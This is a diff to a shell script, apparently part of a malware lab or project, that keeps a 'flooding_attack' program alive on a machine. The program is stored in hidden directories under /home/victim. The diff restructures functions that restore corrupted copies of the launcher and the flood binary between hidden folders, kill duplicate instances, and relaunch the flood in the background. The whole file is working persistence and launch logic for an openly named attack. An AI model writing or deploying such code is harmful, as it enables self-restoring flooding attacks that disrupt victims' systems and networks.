@@ -1,20 +1,20 @@
 #!/bin/sh
 
-home_dir="/home/victim"
-launch_dir1=".Launch_Attack"
-launch_dir2=".Attack_Launch"
-dir01=".etc"
-dir02=".var"
-module_dir=".module"
-launch_file="launching_attack.sh"
-flooding_file="flooding_attack"
-
 is_process_exist() {
   local process_name="flooding_attack"
   ps -e | grep -q "$process_name"
 }
 
-check_file_and_launch_attack() {
+check_process() {
+  is_process_exist
+  if [ $? -eq 0 ]; then # positive match
+  echo "Attack already launched!"
+  pkill -f /home/victim/.etc/.module/flooding_attack
+  pkill -f /home/victim/.var/.module/flooding_attack
+  fi
+}
+
+check_launching_file() {
   # restore corrupted launching file
   if [ -f "$home_dir/$launch_dir1/$launch_file" ] ||\
     [ ! -f "$home_dir/$launch_dir2/$launch_file" ]
@@ -25,7 +25,12 @@ check_file_and_launch_attack() {
   then
     cp -r "$home_dir/$launch_dir2" "$home_dir/$launch_dir1"
   fi
+}
+
+launch_attack() {
   # launching attack and restore corrupted flooding attack files
+  check_process
+  echo "Launching Flooding Attack..."
   if [ -f "$home_dir/$dir01/$module_dir/$flooding_file" ] ||\
     [ ! -f "$home_dir/$dir02/$module_dir/$flooding_file" ]
   then
@@ -37,21 +42,23 @@ check_file_and_launch_attack() {
     $home_dir/$dir02/$module_dir/flooding_attack&
     cp -r "$home_dir/$dir02" "$home_dir/$dir01"
   fi
-}
-
-payload() {
-  is_process_exist
-  if [ $? -eq 0 ]; then # positive match
-    echo "Attack already launched!"
-    pkill -f /home/victim/.etc/.module/flooding_attack
-    pkill -f /home/victim/.var/.module/flooding_attack
-  fi
-  echo "Launching Flooding Attack..."
-  check_file_and_launch_attack
   echo "Flooding Attack running Background!"
 }
 
+payload() {
+  check_launching_file
+  launch_attack
+}
+
 main() {
+  local home_dir="/home/victim"
+  local launch_dir1=".Launch_Attack"
+  local launch_dir2=".Attack_Launch"
+  local dir01=".etc"
+  local dir02=".var"
+  local module_dir=".module"
+  local launch_file="launching_attack.sh"
+  local flooding_file="flooding_attack"
   payload
 }
 main
